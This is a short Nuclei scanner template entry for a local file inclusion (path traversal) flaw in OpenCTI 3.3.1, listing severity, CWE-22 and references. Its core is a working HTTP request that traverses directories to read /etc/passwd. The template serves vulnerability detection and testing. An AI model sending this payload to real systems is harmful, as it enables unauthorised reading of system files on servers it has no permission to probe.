# Nuclei Template: OpenCTI 3.3.1 - Local File Inclusion
**Template ID:** opencti-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`opencti-lfi.yaml`)

## Vulnerability Information & PoC

## Description
OpenCTI 3.3.1 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/static/css//../../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2020060078
- https://github.com/OpenCTI-Platform/opencti/releases/tag/3.3.1
